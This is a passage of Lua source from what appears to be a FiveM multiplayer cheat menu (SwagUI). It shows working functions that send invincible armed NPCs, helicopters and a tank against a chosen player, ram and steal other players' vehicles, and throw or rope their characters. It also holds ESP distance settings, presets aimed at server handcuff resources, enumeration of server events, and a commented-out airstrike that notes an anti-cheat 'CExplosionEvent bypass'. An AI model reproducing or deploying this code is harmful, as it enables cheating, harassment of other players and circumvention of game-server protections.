                local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                NetworkRegisterEntityAsNetworked(ped)
                if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    local netped = PedToNet(ped)
                    NetworkSetNetworkIdDynamic(netped, false)
                    SetNetworkIdCanMigrate(netped, true)
                    SetNetworkIdExistsOnAllMachines(netped, true)
                    Citizen.Wait(500)
                    GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
                    SetEntityInvincible(ped, true)
                    SetPedCanSwitchWeapon(ped, true)
                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                    TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                else
                    Citizen.Wait(0)
                end
            end
        end
    end)
end

function Spawn_Heli_Enemies(target)
	Citizen.CreateThread(function()
		local x, y, z = table.unpack(GetEntityCoords(target))
		local flacko_veri_cool = 'buzzard'
		local SwagUI_flighter = 'ig_claypain'
		RequestModelSync(flacko_veri_cool)
		RequestModelSync(SwagUI_flighter)
		RequestModel(flacko_veri_cool)
		RequestModel(SwagUI_flighter)
		Citizen.CreateThread(function()
			local timeout = 0
			while not HasModelLoaded(SwagUI_flighter) do
				timeout = timeout + 100
				Citizen.Wait(100)
				if timeout > 5000 then
					Blazes.PushNotification('Could not load model!', 5000)
					break
				end
			end
			while not HasModelLoaded(flacko_veri_cool) do
				timeout = timeout + 100
				Citizen.Wait(100)
				if timeout > 5000 then
					Blazes.PushNotification('Could not load model!', 5000)
					break
				end
			end
			local flacko_dream_heli = CreateVehicle(GetHashKey(flacko_veri_cool),x,y,z + 100, GetEntityHeading(target), true, true)
			local newDriver = CreatePedInsideVehicle(flacko_dream_heli, 4, SwagUI_flighter, -1, true, false)
			SetHeliBladesFullSpeed(flacko_dream_heli)

			SetCurrentPedVehicleWeapon(newDriver, GetHashKey("VEHICLE_WEAPON_PLANE_ROCKET"))
			SetVehicleShootAtTarget(newDriver, target, x, y, z)

			local netped = PedToNet(newDriver)
			NetworkSetNetworkIdDynamic(netped, false)
			SetNetworkIdCanMigrate(netped, true)
			SetNetworkIdExistsOnAllMachines(netped, true)
			Citizen.Wait(30)
			NetToPed(netped)
			SetEntityInvincible(netped, true)
			
			SetPedCanSwitchWeapon(newDriver, true)
			TaskCombatPed(newDriver, target, 0, 16)
			
			local model = 'a_m_y_skater_01'
			local wep = "WEAPON_ASSAULTRIFLE"
			for i = 1, 3 do
				local coords = GetEntityCoords(target)
				RequestModel(GetHashKey(model))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(model)) then
					local ped = CreatePedInsideVehicle(flacko_dream_heli, 4, SwagUI_flighter, i, true, false)
					NetworkRegisterEntityAsNetworked(ped)
					Citizen.CreateThread(function()
						if DoesEntityExist(ped) and not IsEntityDead(target) then
							local netped = PedToNet(ped)
							NetworkSetNetworkIdDynamic(netped, false)
							SetNetworkIdCanMigrate(netped, true)
							SetNetworkIdExistsOnAllMachines(netped, true)
							Citizen.Wait(100)
							NetToPed(netped)
							GiveWeaponToPed(ped, GetHashKey(wep), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, target, 0,16)
						else
							Citizen.Wait(0)
						end
					end)
				end
			end
		end)
	end)
end

Spawn_Tank_Enemy = function(target)
	Citizen.CreateThread(function()
		local theTank = 'rhino'
		RequestModel(theTank)
		while not HasModelLoaded(theTank) do
			Citizen.Wait(50)
		end
		local lVehicle = GetVehiclePedIsIn(target, false)
		local x,y,z = table.unpack(GetEntityCoords(target))
		local tank = CreateVehicle(GetHashKey(theTank), x + 20,y + 20,z + 5,GetEntityCoords(target),true,false)
		RequestControlOnce(tank)
		local pPed = 's_m_y_swat_01'
		RequestModel(pPed)
		while not HasModelLoaded(pPed) do
			RequestModel(pPed)
			Citizen.Wait(50)
		end
		local CreateTank = CreatePedInsideVehicle(tank, 4, GetEntityModel(PlayerPedId()), -1, true, false)
		RequestControlOnce(CreateTank)
		SetDriverAbility(CreateTank, 10.0)
		SetDriverAggressiveness(CreateTank, 10.0)
		TaskCombatPed(CreateTank, target, 0, 16)
	end)
end


--Spawn peds End



--[[
local function AirstrikeWaypoint()
	if isAirstrikeRunning then
		return SwagUI.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local WaypointHandle = GetFirstBlipInfoId(8)

	if not DoesBlipExist(WaypointHandle) then
		return SwagUI.SendNotification({text = "You must place a waypoint", type = "error"})
	end

	local function AirstrikeThread()
		isAirstrikeRunning = true

		local target = GetBlipInfoIdCoord(WaypointHandle)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		  
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(aircraft, 29, Airstrike.ped_hash, -1, true, true)
		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)
		
		SetVehicleWeaponsDisabled(aircraft, 2)
		FreezeEntityPosition(aircraft, false)
		TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		--TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)

		SetDriveTaskCruiseSpeed(pilot, 150.0)

		-- Register with network and give up network ownership
		NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		NetworkSetNetworkIdDynamic(netVehid, false)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netVehid, true)
		
		aircraft = NetToVeh(netVehid)

		-- Give up network ownership of ped
		NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		NetworkSetNetworkIdDynamic(netPedid, false)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)
	
		while true do
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)

			if not DoesEntityExist(aircraft) then
				isAirstrikeRunning = false
				return SwagUI.SendNotification({text = "The pilot sux and crashed the jet", type = "error"})
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					local vehCoords = GetEntityCoords(aircraft)
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- print(offset)
					ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
	
				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				Wait(10000)
				DeletePed(pilot)
				
				SetEntityAsMissionEntity(aircraft)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				SwagUI.SendNotification({text = "Airstrike on waypoint is complete!", type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	CreateThreadNow(AirstrikeThread)
end
]]
local onlinePlayerSelected = {} -- used for Online Players menu

local function KeyboardInput(title, initialText, bufferSize)
	local editing, finished, cancelled, notActive = 0, 1, 2, 3

	AddTextEntry("keyboard_title_buffer", title)
	DisplayOnscreenKeyboard(0, "keyboard_title_buffer", "", initialText, "", "", "", bufferSize)

	while UpdateOnscreenKeyboard() == editing do
		HideHudAndRadarThisFrame()
		Wait(0)
	end

	if GetOnscreenKeyboardResult() then return GetOnscreenKeyboardResult() end
end

local SliderOptions = {}

SliderOptions.FastRun = {
	Selected = 1,
	Values = { 1.0, 1.09, 1.19, 1.29, 1.39, 1.49 },
	Words = {"Default", "+20%", "+40%", "+60%", "+80%", "+100%"},
}

SliderOptions.Jradius = {
	Selected = 1,
	Values = { 0.0, 5.0, 10.0, 15.0, 20.0, 50.0 },
	Words = { "Off", "5.0", "10.0", "15.0", "20.0", "50.0" },
}

SliderOptions.DamageModifier = {
	Selected = 1,
	Values = {1.0, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "2x", "5x", "10x", "25x", "50x", "100x", "200x", "500x", "1000x"}
}

SliderOptions.CuffType = {
	Selected = 1,
	Values = {0,1,2,3,4,5,6},
	Words = {"OG_cuffs", "CheckHandcuff", "cuffServer", "cuffGranted", "police", "esx_handcuffs", "esx_policejob"},
}

SliderOptions.ESPDistance = {
	Selected = 1,
	Values = {100,250,500,750,1000,2000,9999},
	Words = {"100m", "250m", "500m", "750m", "1000m", "2000m", "9999m"},
}

local ComboOptions = {}

ComboOptions.TPTo = {
	Selected = 1,
	Values = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,},
	Words = {"In The Sky", "Weed Farm", "Meth Farm", "Coke Farm", "Money Wash", "Mission Row PD", "Legion Square", "Vespucci Beach", "Sandy Shores", "Blaine County"},
}

ComboOptions.RamPlayerVehicle = {
	Selected = 1,
	Values = {"bus", "monster", "freight", "bulldozer"},
	Words = {"Bus", "Monster", "Freight", "BullDozer"},
}

ComboOptions.MK2 = {
	Selected = 1,
	Values = {"", "_mk2"},
	Words = {"Mk I", "Mk II"},
}

ComboOptions.EnginePower = {
	Selected = 1,
	Values = {1.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "+25%", "+50%", "+100%", "+200%", "+500%", "+1000%"}
}

ComboOptions.XenonColor = {
	Selected = 1,
	Values = {-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
	Words = {"Default", "White", "Blue", "Electric", "Mint", "Lime", "Yellow", "Gold", "Orange", "Red", "Pink", "Hot Pink", "Purple", "Blacklight"}
}

local function GetDirtLevel(vehicle)
	local x = GetVehicleDirtLevel(vehicle)
	local val = floor(((x / 7.5) + 1) + 0.5)
	
	return val
end

ComboOptions.DirtLevel = {
	Selected = GetDirtLevel,
	Values = {0.0, 7.5, 15.0},
	Words = {"Clean", "Dirty", "Filthy"}
}

ComboOptions.fcars = {
	Selected = 1,
	Values = {"prop_wheelchair_01", "prop_ld_toilet_01", "prop_t_sofa", "p_cablecar_s", "prop_wheelbarrow02a", "prop_rub_trolley02a", "prop_bumper_car_01", "prop_crashed_heli", "ind_prop_dlc_roller_car"},
	Words = {"Wheelchair", "Toilet", "Sofa", "Shitty Car", "WheelBarrow", "Trolley", "Bumper Car", "Crashed Helicopter", "Roller Coaster"}
}

local function RepairVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	RequestControlOnce(vehicle)
	SetVehicleFixed(vehicle)
	SetVehicleLightsMode(vehicle, 0)
	SetVehicleLights(vehicle, 0)
	SetVehicleBurnout(vehicle, false)
	SetVehicleEngineHealth(vehicle, 1000.0)
	SetVehicleFuelLevel(vehicle, 100.0)
	SetVehicleOilLevel(vehicle, 100.0)
	return true
end


function TPToF(TPTo)
	if TPTo == 1 then
		local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
		teleport_to_coords(x,y,z + 200)
	elseif TPTo == 2 then
		teleport_to_coords(1066.009, -3183.386, -39.164)
	elseif TPTo == 3 then
		teleport_to_coords(998.629, -3199.545, -36.394)
	elseif TPTo == 4 then
		teleport_to_coords(1088.636, -3188.551, -38.993)
	elseif TPTo == 5 then
		teleport_to_coords(1118.405, -3193.687, -40.394)
	elseif TPTo == 6 then
		teleport_to_coords(441.56, -982.9, 30.69)
	elseif TPTo == 7 then
		teleport_to_coords(195.23, -934.04, 30.69)
	elseif TPTo == 8 then
		teleport_to_coords(-1653.85, -860.87, 9.16)
	elseif TPTo == 9 then
		teleport_to_coords(2024.28, 3770.94, 32.18)
	elseif TPTo == 10 then
		teleport_to_coords(-183.57, 6366.65, 31.47)
	end
end

function Ram_Vehicle(target, m_vehicle)
    local model = GetHashKey(m_vehicle)
    RequestModel(model)
    while not HasModelLoaded(model) do
        Citizen.Wait(0)
    end
    local offset = GetOffsetFromEntityInWorldCoords(target, 0, -10.0, 0)
    if HasModelLoaded(model) then
        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(target), true, true)
        SetVehicleForwardSpeed(veh, 120.0)
    end
end

local function FlipVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	return SetVehicleOnGroundProperly(vehicle)
end

local function GetVehicleInFrontOfMe()
	
	local playerPos = GetEntityCoords( PlayerPedId() )
	local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
	local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
    local _, _, _, _, vehicle = GetRaycastResult( rayHandle )
	
	return vehicle
end

local function RemoveVehicle(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	SetEntityAsMissionEntity(vehicle, true, true)
	DeleteVehicle(vehicle)

	return true
end

local function TeleportToPlayerVehicle(player)
	local ped = GetPlayerPed(player)
	if not IsPedInAnyVehicle(ped) then
		return SwagUI.SendNotification({text = ("%s is not in a vehicle!"):format(GetPlayerName(player)), type = "error"})
	end

	local vehicle = GetVehiclePedIsUsing(GetPlayerPed(player))

	local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	for i = 0, seats do
		if IsVehicleSeatFree(vehicle, i) then
			SetPedIntoVehicle(PlayerPedId(), vehicle, i)
			break
		end
	end
end

local function ChangeVehiclePlateText(vehicle)
	local plateText = KeyboardInput("Enter new plate text", "", 8)

	if vehicle ~= 0 then 
		SetVehicleNumberPlateText(vehicle, plateText)
		return true
	end

	return false
end

local function DriveVehicle(vehicle)
	if vehicle == 0 then
		vehicle = GetVehicleInFrontOfMe()
	end

	SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
end

local function StealVehicle(player)
Citizen.CreateThread (function()
	local ped = GetPlayerPed(player)
	--local ped = GetPedInVehicleSeat(vehicle, -1)
	--local vehicleNet = VehToNet(vehicle)

		local vehicle = GetVehiclePedIsUsing(ped)

	RequestControlOnce(ped)
	ClearPedTasksImmediately(ped)

	while not IsVehicleSeatFree(vehicle, -1) do
		Citizen.Wait(10)
	end

	SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
	TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
	end)

end

ComboOptions.VehicleActions = {
	Selected = 1,
	Values = {RepairVehicle, FlipVehicle, DriveVehicle, RemoveVehicle},
	Words = {"Repair", "Flip", "Drive", "Delete"}
}

local currentMods = nil
local EngineUpgrade = {-1, 0, 1, 2, 3}
local VehicleUpgradeWords = {

	{"STOCK", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "LEVEL 4", "MAX LEVEL"},

}

local themeColors = {
	red = { r = 231, g = 76, b = 60, a = 255 },  -- rgb(231, 76, 60)
	orange = { r = 230, g = 126, b = 34, a = 255 }, -- rgb(230, 126, 34)
	yellow = { r = 241, g = 196, b = 15, a = 255 }, -- rgb(241, 196, 15)
	green = { r = 26, g = 188, b = 156, a = 255 }, -- rgb(26, 188, 156)
	blue = { r = 0, g = 104, b = 222, a = 255 }, -- rgb(52, 152, 219)
	purple = { r = 155, g = 89, b = 182, a = 255 }, -- rgb(155, 89, 182)
	white = { r = 236, g = 240, b = 241, a = 255} -- rgb(236, 240, 241)
}
-- Set a default menu theme
_menuColor.base = themeColors.blue

local dynamicColorTheme = false

local texture_preload = {
	"commonmenu",
	"heisthud",
	"mpweaponscommon",
	"mpweaponscommon_small",
	"mpweaponsgang0_small",
	"mpweaponsgang1_small",
	"mpweaponsgang0",
	"mpweaponsgang1",
	"mpweaponsunusedfornow",
	"mpleaderboard",
	"mphud",
	"mparrow",
	"pilotschool",
	"shared",
	"commonmenutu",
	"mpinventory",
	"mp_freemode_mc",
	"hunting",
	"digitaloverlay",
	"helicopterhud",
}

local function PreloadTextures()
	
	--print("^7Preloading texture dictionaries...")
	for i = 1, #texture_preload do
		RequestStreamedTextureDict(texture_preload[i])
	end

end

PreloadTextures()

local function KillYourselfThread()
	local playerPed = PlayerPedId()
	local canSuicide = false
	local foundWeapon = nil

	GiveWeaponToPed(playerPed, GetHashKey("WEAPON_PISTOL"), 250, false, true)

	if HasPedGotWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) then
		if GetAmmoInPedWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) > 0 then
			canSuicide = true
			foundWeapon = GetHashKey('WEAPON_PISTOL')
		end
	end

	if canSuicide then
		if not HasAnimDictLoaded('mp_suicide') then
			RequestAnimDict('mp_suicide')

			while not HasAnimDictLoaded('mp_suicide') do
				Wait(0)
			end
		end

		SetCurrentPedWeapon(playerPed, foundWeapon, true)

		Wait(1000)

		TaskPlayAnim(playerPed, "mp_suicide", "pistol", 8.0, 1.0, -1, 2, 0, 0, 0, 0 )

		Wait(750)

		SetPedShootsAtCoord(playerPed, 0.0, 0.0, 0.0, 0)
		SetEntityHealth(playerPed, 0)
	end
end

local validResources = {}
local validResourceEvents = {}
local validResourceServerEvents = {}

local function KillYourself()
	CreateThread(KillYourselfThread)
end

local function GetResources()
    local resources = {}
	for i = 1, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

local function VerifyResource(resourceName)
	TriggerEvent(resourceName .. ".verify", function(resource) validResources[#validResources + 1] = resource end)
end

for i, v in ipairs(GetResources()) do
	VerifyResource(v)
end


local function RefreshResourceData()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getEvents", function(rscName, events) validResourceEvents[rscName] = events end)
	end
end

local function UpdateServerEvents()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getServerEvents", function(rscName, events) validResourceServerEvents[rscName] = events end)
	end
end

local function RefreshServerEvents()
	while isMenuEnabled do
		UpdateServerEvents()
		Wait(5000)
	end
end

CreateThread(RefreshServerEvents)

RefreshResourceData()

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function MagnetoModeThread()
	local ForceKey = Swag.Keys["E"]
	local Force = 0.5
	local KeyPressed = false
	local KeyTimer = 0
	local KeyDelay = 15
	local ForceEnabled = false
	local StartPush = false

	function forcetick()
		
		if (KeyPressed) then
			KeyTimer = KeyTimer + 1
			if (KeyTimer >= KeyDelay) then
				KeyTimer = 0
				KeyPressed = false
			end
		end
		
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
			KeyPressed = true
			ForceEnabled = true
		end
		
		if (StartPush) then
			
			StartPush = false
			local pid = PlayerPedId()
			local CamRot = GetGameplayCamRot(2)
			
			local force = 5
			
			local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
			local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
			local Fz = force * (CamRot.x * 0.2)
			
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			for k in EnumerateVehicles() do
				SetEntityInvincible(k, false)
				if IsEntityOnScreen(k) and k ~= PlayerVeh then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
			
			for k in EnumeratePeds() do
				if IsEntityOnScreen(k) and k ~= pid then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
		
		end
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
			KeyPressed = true
			StartPush = true
			ForceEnabled = false
		end
		
		if (ForceEnabled) then
			local pid = PlayerPedId()
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
			
			DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 35, false, true, 2, nil, nil, false)
			
			for k in EnumerateVehicles() do
				SetEntityInvincible(k, true)
				if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
					RequestControlOnce(k)
					FreezeEntityPosition(k, false)
					Oscillate(k, Markerloc, 0.5, 0.3)
				end
			end
			
			for k in EnumeratePeds() do
				if IsEntityOnScreen(k) and k ~= PlayerPedId() then
					RequestControlOnce(k)
					SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
					FreezeEntityPosition(k, false)
					Oscillate(k, Markerloc, 0.5, 0.3)
				end
			end
		
		end
	
	end

	while Swag.Toggle.MagnetoMode do forcetick()Wait(0) end
end

local function MagnetoMode()
    Swag.Toggle.MagnetoMode = not Swag.Toggle.MagnetoMode
    
	if Swag.Toggle.MagnetoMode then
		SwagUI.SendNotification({text = "Press ~b~E~s~ to use Magneto", type = "info"})

        CreateThread(MagnetoModeThread)
	end
end



local function RandomSkin(target)
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, false)
		SetPedRandomProps(ped)	
end

local function ChangeModel()
	local model = KeyboardInput("Enter Model Name", "", 100)
	RequestModel(GetHashKey(model))
	Wait(500)
	if HasModelLoaded(GetHashKey(model)) then
		SetPlayerModel(PlayerId(), GetHashKey(model))
	end
end

local function BecomeBigfoot()
	local bigfoot_name = "ig_orleans"
	RequestModel(GetHashKey(bigfoot_name))
	Wait(500)
	if HasModelLoaded(GetHashKey(bigfoot_name)) then
		SetPlayerModel(PlayerId(), GetHashKey(bigfoot_name))
	end
end

function control_nearest_ped(animal_only)
-- X, Y, Z, Radius, exc
	Citizen.CreateThread(function()
		local pl_coords = GetEntityCoords(PlayerPedId(), false)
		local nearest_target = nil
		local closest_dist = 99999.0
		
		for ped in EnumeratePeds() do
			if ped ~= nil and ped ~= PlayerPedId() and GetPlayerServerId(ped) == 0 and not IsPedDeadOrDying(ped) then
				local ptype = GetPedType(ped)
				if ((ptype == 28 and animal_only) or (not animal_only and ptype ~= 28)) then
					local ped_pos = GetEntityCoords(ped, false)
					local dist = Vdist(pl_coords.x, pl_coords.y, pl_coords.z, ped_pos.x, ped_pos.y, ped_pos.z)
					if dist < closest_dist then
						closest_dist = dist
						nearest_target = ped
					end
				end
			end
		end
		
		if nearest_target ~= nil then
			local model = GetEntityModel(nearest_target);
			RequestModel(model)
			Wait(500)
			if HasModelLoaded(model) then
				SetPlayerModel(PlayerId(), model)
			end
			CloneP(nearest_target)
			
			if IsPedSittingInAnyVehicle(nearest_target) then
				local vehicle = GetVehiclePedIsUsing(nearest_target)
				ClearPedTasksImmediately(nearest_target)
				DeleteEntity(nearest_target)
				SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
				TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
			else
				local tx, ty, tz = table.unpack(GetEntityCoords(nearest_target))
				DeleteEntity(nearest_target)
				
				SetEntityCoordsNoOffset(PlayerPedId(), tx, ty, tz + 0.2, true, true, true)
			end
		end
	end)
end

--car rockets

-- self section
function ApplyShockwave(entity)
	local pos = GetEntityCoords(PlayerPedId())
	local coord=GetEntityCoords(entity)
	local dx=coord.x - pos.x
	local dy=coord.y - pos.y
	local dz=coord.z - pos.z
	local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
	local distanceRate=(50/distance)*math.pow(1.04,1-distance)
	ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), true, false, true, true, true, true)
end
	
	
function jesus_tick(radius)
	local player = PlayerPedId()
	local coords = GetEntityCoords(PlayerPedId())
	local playerVehicle = GetPlayersLastVehicle()
	local inVehicle=IsPedInVehicle(player,playerVehicle,true)

	DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

	for k in EnumerateVehicles() do
		if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
			RequestControlOnce(k)
			ApplyShockwave(k)
		end
	end

	for k in EnumeratePeds() do
		if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
			RequestControlOnce(k)
			SetPedRagdollOnCollision(k,true)
			SetPedRagdollForceFall(k)
			ApplyShockwave(k)
		end
	end
end

local function vector_sub(a, b)
	return { 
		x = a.x - b.x,
		y = a.y - b.y,
		z = a.z - b.z
	}
end

local function vecotr_len(a)
	return math.sqrt(a.x*a.x + a.y*a.y + a.z*a.z)
end

local function vector_normalize(a)
	local mag = vecotr_len(a)
	
	return { 
		x = a.x * mag,
		y = a.y * mag,
		z = a.z * mag
	}
end

local function vector_mul_f(a, b)
	return {
		x = a.x*b,
		y = a.y*b,
		z = a.z*b
	}
end
				
roped_ents = {}
rope_first_ent = nil

function rope_gun_tick()		
	while isMenuEnabled do
		if rope_gun then
			local ped = GetPlayerPed(PlayerId())
			local pedPos = GetEntityCoords(ped, false)
				
			local function table_contains_v(tab, val)
				for index, value in ipairs(tab) do
					if value == val then
						return true
					end
				end

				return false
			end
			
			-- get ents
			if IsDisabledControlPressed(1, Swag.Keys["MOUSE1"]) then
			
				local found, spawnedPed = GetEntityPlayerIsFreeAimingAt(PlayerId())
				local ent_type = GetEntityType(spawnedPed)
				if ent_type == 1 then
					if IsPedInAnyVehicle(spawnedPed) then
						spawnedPed = GetVehiclePedIsIn(spawnedPed, false)
					end
				end
				
				if found and not table_contains_v(roped_ents, spawnedPed) then
					RopeLoadTextures()
			
					local pedPos2 = GetEntityCoords(spawnedPed, false)
					
					if rope_gun_self then
						local rope = AddRope(pedPos.x, pedPos.y, pedPos.z, 0.0, 0.0, 0.0, 10.0, 1, 10.0, 1.0, 0, 0, 0, 0, 0, 0, 0)
						AttachEntitiesToRope(rope, ped, spawnedPed, pedPos.x, pedPos.y, pedPos.z, pedPos2.x, pedPos2.y, pedPos2.z, 15, false, false, 0, 0)
					else
						if rope_first_ent == nil then
							rope_first_ent = spawnedPed
						else
							local rope = AddRope(pedPos.x, pedPos.y, pedPos.z, 0.0, 0.0, 0.0, 10.0, 1, 10.0, 1.0, 0, 0, 0, 0, 0, 0, 0)
							local first_pos = GetEntityCoords(rope_first_ent, false)
							AttachEntitiesToRope(rope, rope_first_ent, spawnedPed, first_pos.x, first_pos.y, first_pos.z, pedPos2.x, pedPos2.y, pedPos2.z, 15, false, false, 0, 0)
							table.insert(roped_ents, { ropeid = rope, ped = spawnedPed })
							rope_first_ent = nil
						end
					end
					
					
				end
				--end
				--print("SPAWNED ROPE: " .. spawnedRope)
			end
			
			-- clear shit
			if IsDisabledControlPressed(1, 182) then
				rope_first_ent = nil
				for i,data in ipairs(roped_ents) do
					table.remove(roped_ents, i)
					DeleteRope(data.ropeid)
				end
			end
			
			-- physics
			for i,data in ipairs(roped_ents) do
				local ped = data.ped
				--[[
				if IsEntityDead(ped) then
					--DeleteRope(data.ropeid)
					--table.remove(roped_ents, i)
				else
				]]
				
				--print(ped)
				
				local target_pos = GetEntityCoords(ped, false)
				
				local force = 1.0
				local needed_dist = 15.0
				
				local ent_type = GetEntityType(ped)
				if ent_type == 2 then -- vehicle
					--SetVehicleEngineOn(ped, false, true)
					force = 0.00025
					needed_dist = 30.0
				elseif ent_type == 1 then -- ped
					--SetPedToRagdoll(ped, 1000, 1000, 0, 0, 0, 0)
					force = 0.00025
					needed_dist = 15.0
				elseif ent_type == 3 then -- object
					force = 0.00025
					needed_dist = 15.0
				end
				
				local dir = vector_mul_f(vector_normalize(vector_sub(pedPos, target_pos)), force)
				
				local coords = GetEntityCoords(GetPlayerPed(-1), true)
